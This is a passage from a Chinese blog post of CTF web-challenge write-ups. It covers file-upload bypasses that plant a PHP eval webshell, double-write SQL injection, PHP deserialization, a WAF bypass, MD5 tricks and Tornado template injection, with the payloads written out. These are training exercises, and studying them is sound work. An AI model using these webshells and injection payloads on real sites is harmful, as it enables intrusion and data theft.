<pre><code>&lt;script language="php"&gt;eval($_POST['shell']);&lt;/script&gt;
注意我们这里cmd就是我们开的后门shell密码
</code></pre> 
<p><img src="https://images2.imgbox.com/66/f3/p6dhcBDA_o.png" alt="在这里插入图片描述"><br> 依然会有一个报错的提示，说明我们需要添加图片的头，然后再进行上传</p> 
<pre><code>GIF89a
</code></pre> 
<p><img src="https://images2.imgbox.com/37/98/iykB9tde_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/d6/ca/aRMYjUh5_o.png" alt="在这里插入图片描述"></p> 
<p>提示我们上传成功了，但是我们上传的仅仅是一个.jpg的文件，无法供我们利用，这时候我们需要使用到BP进行一下简单的抓包，并且将.jpg更改为.phtml，使得网页后端可以执行我们的一句话木马<img src="https://images2.imgbox.com/70/72/sCDBrGl1_o.png" alt=""></p> 
<p><img src="https://images2.imgbox.com/6e/66/P07OwSVJ_o.png" alt="在这里插入图片描述"></p> 
<p>然后我们小马就带着我们成功进入了网站的后台使用AntSword连接网站后门，这里需要开启php服务</p> 
<pre><code>也可以使用/upload/filename进行直接访问打开文件
这里我重新上传了一个shell文件名的小马
</code></pre> 
<p><img src="https://images2.imgbox.com/b8/4b/twCat0XX_o.png" alt="在这里插入图片描述"><br> 然后就可以对网站后台数据库进行访问<br> <img src="https://images2.imgbox.com/60/b6/TCEsXPFb_o.png" alt="在这里插入图片描述"></p> 
<pre><code>注：
在使用AntSword时有的同学在测试连接时显示返回为空，说明你的一句话木马有问题，未能被服务器正常解析，可以检查一下上传的文件格式和代码是否有误
</code></pre> 
<p>我们打开虚拟终端返回到根目录</p> 
<pre><code> cd /
</code></pre> 
<p><img src="https://images2.imgbox.com/bd/89/Hx8w7PWf_o.png" alt="在这里插入图片描述"><br> 然后查看flag文件</p> 
<pre><code>cat flag
</code></pre> 
<p><img src="https://images2.imgbox.com/5e/14/qzkSonaz_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="ACTF2020_Upload_558"></a>[ACTF2020 新生赛]Upload</h2> 
<p><img src="https://images2.imgbox.com/3e/ca/KrkTIslx_o.png" alt="在这里插入图片描述"><br> 当我们把鼠标移动到灯泡上时，发现了可以进行的文件上传地址，先简单构造一个payload进行尝试一下一句话木马上传</p> 
<pre><code>&lt;?php phpinfo(); @eval($_POST['shell']); ?&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/7c/32/397a8CSc_o.png" alt="在这里插入图片描述"><br> 提示我们只能上传固定格式的图片，那我们更改文件格式，并加上图片头</p> 
<p><img src="https://images2.imgbox.com/8b/c9/hhAWy670_o.png" alt="在这里插入图片描述"><code>GIF89a</code><br> 提示我们文件上传成功<br> <img src="https://images2.imgbox.com/ed/f8/AGyNqMLU_o.png" alt="在这里插入图片描述"><br> 我们先进行简单抓包更改shell的文件格式为.phtml使其能够运行为我们打开后门<br> <img src="https://images2.imgbox.com/15/39/NcLTrUo9_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/51/cb/17SjVBV3_o.png" alt="在这里插入图片描述"></p> 
<p>上传成功后提示我们上传到的路径为./uplo4d,尝试用AntSword进行数据库连接<br> <img src="https://images2.imgbox.com/f2/e3/onOS34DO_o.png" alt="在这里插入图片描述"></p> 
<pre><code>注意这里我直接只使用  /uplo4d进行连接时一直报错，看了好多博主但是他们也是只有这个好像，最后才试出来连接时要把所有的全写完整才能连接成功而且编码器最好使用base64进行编码，不然可能是乱码而且无法使用shell
</code></pre> 
<p><img src="https://images2.imgbox.com/c1/fa/FmVrhoCv_o.png" alt="在这里插入图片描述"></p> 
<p>接下来就是返回根目录然后查看flag文件了</p> 
<pre><code>返回根目录
cd 
查看flag
cat flag
</code></pre> 
<p><img src="https://images2.imgbox.com/ce/2f/Dkoj6qtC_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_2019BabySQL_592"></a>[极客大挑战 2019]BabySQL</h2> 
<p><img src="https://images2.imgbox.com/6d/32/c46PjeEl_o.png" alt="在这里插入图片描述"><br> 经典的SQL注入题，先尝试一下万能密码<img src="https://images2.imgbox.com/2f/18/qgjAQJ1O_o.png" alt="在这里插入图片描述"><br> 我们发现他把我们注入时输入的or过滤了，那我们尝试一下双写or ,这样他在删除一个or以后还会有，但是依然发现不可以</p> 
<pre><code>1’ oorr 1=1
</code></pre> 
<p><img src="https://images2.imgbox.com/84/82/Bb3ViMvo_o.png" alt="在这里插入图片描述"><br> 那我们换思路进行一下进行联合注入（盲猜和之前一样三列），发现同样删除过滤了我们的union select关键字<br> <img src="https://images2.imgbox.com/5b/ff/j1SVJ3PN_o.png" alt="在这里插入图片描述">依然对union select进行双写尝试，发现可以</p> 
<pre><code>1' ununionion seselectlect 1,2,3#
</code></pre> 
<p><img src="https://images2.imgbox.com/72/f1/drRNYTMv_o.png" alt="在这里插入图片描述"><br> 那接下来就是爆库常规的SQL注入了，同样如果遇到被删除过滤的部分进行双写即可</p> 
<pre><code>1' ununionion seselectlect 1,2,database()#
</code></pre> 
<p><img src="https://images2.imgbox.com/13/5a/jv0ioQad_o.png" alt="在这里插入图片描述"></p> 
<pre><code>1' ununionion seselectlect 1,2,group_concat(schema_name)frfromom (infoorrmation_schema.schemata) #
</code></pre> 
<p><img src="https://images2.imgbox.com/49/f3/WSe9udyZ_o.png" alt="在这里插入图片描述"></p> 
<pre><code>1' ununionion seselectlect 1,2,group_concat(column_name)frfromom(infoorrmation_schema.columns)whwhereere  table_name="Flag" 
</code></pre> 
<p><img src="https://images2.imgbox.com/aa/13/gyvsgtKF_o.png" alt="在这里插入图片描述"></p> 
<pre><code>1' ununionion seselectlect 1,2,group_concat(flag)frfromom(ctf.Flag) 
</code></pre> 
<p><img src="https://images2.imgbox.com/97/2e/0k3lvPdG_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_2019PHP_629"></a>[极客大挑战 2019]PHP</h2> 
<p><img src="https://images2.imgbox.com/a2/18/3q2McY2v_o.png" alt="在这里插入图片描述">题目说他进行了备份 那我们扫描网站目录，发现了www.zip进行访问<br> <img src="https://images2.imgbox.com/50/25/OcGZhLvJ_o.png" alt="在这里插入图片描述">发现网站的源码直接被我们下载了<br> <img src="https://images2.imgbox.com/31/72/3fbqnF58_o.png" alt="在这里插入图片描述"><br> 源码中有这几个文件，打开我们可以使用记事本<br> <img src="https://images2.imgbox.com/29/9b/Y0947DhK_o.png" alt="在这里插入图片描述"><br> 打开flag.php进行查看，发现错误不是我们想要的flag<br> <img src="https://images2.imgbox.com/4a/9e/ihYJM6Be_o.png" alt="在这里插入图片描述">那我们再查看一下index.php<br> <img src="https://images2.imgbox.com/99/0a/qj8QpB3L_o.png" alt="在这里插入图片描述"></p> 
<pre><code>发现一段php文件，包含class.php文件
用get的方式传入一个select参数，并将结果反序列化（unserialize）
</code></pre> 
<p>那我们查看一下class.php<br> <img src="https://images2.imgbox.com/f8/9d/AHbP84Qv_o.png" alt="在这里插入图片描述"></p> 
<pre><code>根据class中代码的意思
我们可以发现如果username=admin password=100然后我们再执行__destruct()时可以获得flag
</code></pre> 
<p>因此我们需要构造反序列化，替换select参数，输入admin和100<br> 运行后获得序列化的字符串，可以使用<a href="https://c.runoob.com/compile/1/" rel="nofollow">php在线编译器</a></p> 
<pre><code>&lt;?php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
 
    public function __construct($username,$password){
        $this-&gt;username = $username;
        $this-&gt;password = $password;
    }
}
$a = new Name('admin', 100);
var_dump(serialize($a));
?&gt;
</code></pre> 
<p><img src="https://images2.imgbox.com/ba/b9/gpndJLVy_o.png" alt="在这里插入图片描述"></p> 
<pre><code>O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
</code></pre> 
<p>我们将用这串序列化的字符串替换select于是我们有了这样的payload</p> 
<pre><code>?select=O:4:“Name”:2:{s:14:“Nameusername”;s:5:“admin”;s:14:“Namepassword”;i:100;}
</code></pre> 
<p><img src="https://images2.imgbox.com/bf/48/y6Dk9uXl_o.png" alt="在这里插入图片描述"><br> 进行访问时页面没有反应，可能是因为username和password是private字段</p> 
<pre><code>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度
</code></pre> 
<p>所以更改payload为</p> 
<pre><code>?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
</code></pre> 
<p><img src="https://images2.imgbox.com/3c/b2/mraaRVIs_o.png" alt="在这里插入图片描述"><br> 找到flag</p> 
<h2><a id="ACTF2020_BackupFile_693"></a>[ACTF2020 新生赛]BackupFile</h2> 
<p>根据题目意思可以知道这个是备份文件的题目，我们直接使用kali中的dirsearch进行扫描文件目录<br> <img src="https://images2.imgbox.com/a2/66/qMa0HnSy_o.png" alt="在这里插入图片描述"><br> 可以看到我们扫描到了一个/index.php.bak的文件，对该文件进行访问</p> 
<pre><code>http://3a65cb36-9643-452c-8f4a-43589c302f5f.node4.buuoj.cn:81//index.php.bak
</code></pre> 
<p><img src="https://images2.imgbox.com/d6/ec/8YEk6DRp_o.png" alt="在这里插入图片描述"><br> 访问后备份php文件被我们下载<br> <img src="https://images2.imgbox.com/bb/74/FVF7g75F_o.png" alt="在这里插入图片描述"><br> 进行访问该备份文件，查看内容<br> <img src="https://images2.imgbox.com/71/66/uRnkmCBl_o.png" alt="在这里插入图片描述"></p> 
<pre><code>可以看到这里是一个 若相等  即php中==进行证书和字符串类型相比较时，会先将字符串转化为整数然后再进行比较，只截取前面整数部分，故再访问为
http://3a65cb36-9643-452c-8f4a-43589c302f5f.node4.buuoj.cn:81/?key=123
</code></pre> 
<p><img src="https://images2.imgbox.com/45/94/3jQuxbMC_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="RoarCTF_2019Easy_Calc_714"></a>[RoarCTF 2019]Easy Calc</h2> 
<p>1<br> <img src="https://images2.imgbox.com/c2/af/itJlu0oQ_o.png" alt="在这里插入图片描述"><br> 首先看页面没有什么提示，查看一下网页源代码，看到有一个名为clac.php的文件，并且设置了waf<br> <img src="https://images2.imgbox.com/9b/31/9WoMbxPg_o.png" alt="在这里插入图片描述"><br> 尝试进行访问</p> 
<pre><code>/calc.php
</code></pre> 
<p>发现文件对一些敏感字符进行了过滤，并且使用get方式传参给num，只要能够绕过过滤，就可以通过eval进行任意php语句<br> <img src="https://images2.imgbox.com/09/1a/Dq0o0Gu8_o.png" alt="在这里插入图片描述"><br> 首先尝试</p> 
<pre><code>?num=phpinfo()
</code></pre> 
<p><img src="https://images2.imgbox.com/13/2b/WFLbxEn2_o.png" alt="在这里插入图片描述"><br> 被waf进行了拦截，我们可以在num前加一个空格进行简单的绕过<br> <strong>原理：</strong> php解析规则：如果变量名前面有空格，则删除空格在进行解析，假如waf不允许num接受字母，则 num就可以</p> 
<pre><code>/calc.php/?%20num=phpinfo()
</code></pre> 
<p><img src="https://images2.imgbox.com/bb/d2/YCYDjrVc_o.png" alt="在这里插入图片描述"><br> 成功绕过，使用scandir查看目录中的内容，找到flag</p> 
<pre><code>? num=scandir("/")
</code></pre> 
<p><img src="https://images2.imgbox.com/a1/3a/wh10DNzS_o.png" alt="在这里插入图片描述"><br> 联想到之前源代码中/被过滤，使用char对/进行ASCII编码进行绕过</p> 
<pre><code>? num=var_dump(scandir(chr(47)))
</code></pre> 
<p><img src="https://images2.imgbox.com/0b/8e/eR6mxNWn_o.png" alt="在这里插入图片描述"><br> 读取flagg文件获得flag</p> 
<pre><code>? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
</code></pre> 
<p><img src="https://images2.imgbox.com/f6/ff/cYLQPWq1_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_2019BuyFlag_756"></a>[极客大挑战 2019]BuyFlag</h2> 
<p><img src="https://images2.imgbox.com/05/aa/sxlgM8IN_o.png" alt="在这里插入图片描述"><br> 网页提示需要前，身份和密码，查看一下源代码，发现了一些文件和传参方式<br> <img src="https://images2.imgbox.com/2b/9b/TFGDg6M1_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/22/f4/v57C5Qqm_o.png" alt="在这里插入图片描述"><br> 那我们先尝试抓包，然后修改数值请求为post即可成功拿到flag<br> <img src="https://images2.imgbox.com/ad/a9/NyHXECnT_o.png" alt="在这里插入图片描述"><br> 这里显示数值过大，要用1e9代替100000000<br> <img src="https://images2.imgbox.com/2f/60/rhojoHhe_o.png" alt="在这里插入图片描述"><br> 成功</p> 
<h2><a id="BJDCTF2020Easy_MD5_767"></a>[BJDCTF2020]Easy MD5</h2> 
<pre><code>知识点：sql注入，md5绕过，构造md5的or使判断为真，数组，md5碰撞
</code></pre> 
<p><img src="https://images2.imgbox.com/3a/24/hpmEKlex_o.png" alt="在这里插入图片描述">当我们进行查询时，实际上使用的时sql语句查询，但是使用的是MD5的加密算法，所以我们可以构造一个MD5含有or的语句，置为真</p> 
<pre><code>当存在参数true时，使用原始16字符二进制格式，找到ffifdyop字符串经过MD5哈希之后，会变成276f722736c95d99e921722cf9ed621c，mysql会把hex当作Ascii码来解释所以这几个字符相当于:’ or '6xxxxxxx。这就相当于一个万能密码了我们来试试
?password=ffifdyop
</code></pre> 
<p><img src="https://images2.imgbox.com/8d/7b/RccMrMTz_o.png" alt="在这里插入图片描述"><img src="https://images2.imgbox.com/9a/37/frbXjUNj_o.png" alt="在这里插入图片描述"><br> 得到提示告诉我们这是一个md5弱类型比较，我们可以在网上找一些0e开头的md5值，进行md5碰撞<br> <img src="https://images2.imgbox.com/75/86/4ttVYJ69_o.png" alt="在这里插入图片描述"><br> 将上述任意俩个值传给a和b<br> 得到新的提示<br> <img src="https://images2.imgbox.com/34/1c/LRnixc4q_o.png" alt="在这里插入图片描述"><br> 这里我们发现需要用post进行传参，这俩个值要求不相等且md5加密后要相等，所以我们使用md5弱类型比较，把这俩个参数当成数组进行赋值就可以成功绕过<br> <img src="https://images2.imgbox.com/ce/59/XTWUC9g7_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="_2018easy_tornado_787"></a>[护网杯 2018]easy_tornado</h2> 
<p><img src="https://images2.imgbox.com/4e/f1/teum9hRo_o.png" alt="在这里插入图片描述"><br> 查看各个文件下的内容<br> <img src="https://images2.imgbox.com/71/26/03rofdtJ_o.png" alt="在这里插入图片描述"></p> 
<p><img src="https://images2.imgbox.com/1d/20/MriW3Wlz_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/1a/5d/B5R0kOXe_o.png" alt="在这里插入图片描述"></p> 
<pre><code>render（）函数是Django中的渲染，想到ssti
tornado.web.Application对象初始化赋予cookie_secret参数，用于保存本网站cookies加密密钥
根据第三个文件，我们打开第一个文件中提示的flag文件所在位置，使用[md5](https://www.sojson.com/md5/)进行加密
</code></pre> 
<p>可以知道我们现在已经发现了俩个参数，一个是filename一个是filehash，目前的问题为如何获取cookie_secret。修改filename使出现error页面<br> <img src="https://images2.imgbox.com/51/23/0R3FFfMs_o.png" alt="在这里插入图片描述"></p> 
<pre><code>构造新的payload：
{<!-- -->{handler.settings}}
</code></pre> 
<p><img src="https://images2.imgbox.com/07/60/6Ny85DzO_o.png" alt="在这里插入图片描述">传参后得到cookie_secret的值，通过md5加密计算cookie_secret+md5(filename)<br> 先加密/fllllllllllllag<br> <img src="https://images2.imgbox.com/bb/a0/yH9RhPsM_o.png" alt="在这里插入图片描述">再根据上面的语法再加密一次<br> <img src="https://images2.imgbox.com/87/5c/SaYtAXSn_o.png" alt="在这里插入图片描述">注入后得到flag<br> <img src="https://images2.imgbox.com/9a/9d/rwb8LFux_o.png" alt="在这里插入图片描述"></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0412a1f5d87cceed2e66957f62dfd853/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">详细图解,二叉排序树的遍历、删除、插入，通过bf优化构建成平衡二叉树(avl树)的原理</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/d01488a66193fd1368cd39639511c54e/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Vue-组件二次封装</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>